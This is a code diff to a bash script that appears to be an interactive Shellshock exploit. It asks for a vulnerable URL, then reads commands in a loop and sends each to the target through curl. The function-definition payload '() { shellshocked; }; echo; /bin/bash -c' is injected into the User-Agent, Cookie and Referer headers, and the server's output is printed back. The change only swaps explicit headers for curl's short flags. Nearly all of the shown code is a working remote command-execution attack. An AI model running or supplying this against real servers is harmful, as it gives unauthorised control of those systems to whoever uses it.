@@ -15,7 +15,7 @@ read -p "Enter the vulnerable url: " url
 echo -e "${green}Enter your command: "
 while read cmd
 do
-   content=$(curl -s -H "User-Agent: () { shellshocked; }; echo; /bin/bash -c \"$cmd\"" -H "Cookie: () { shelshocked; }; echo; /bin/bash -c \"$cmd\"" -H "Referer: () { shellshocked; }; echo; /bin/bash -c \"$cmd\"" -H 'Connection: close' $url)
+   content=$(curl -s -A "() { shellshocked; }; echo; /bin/bash -c \"$cmd\"" -b "() { shelshocked; }; echo; /bin/bash -c \"$cmd\"" -e "() { shellshocked; }; echo; /bin/bash -c \"$cmd\"" -H 'Connection: close' $url)
    echo ${red}$content
    echo "${reset}__________________________________________________________________" ;
    echo -e "${green}Enter a command: ${YELLOW}";
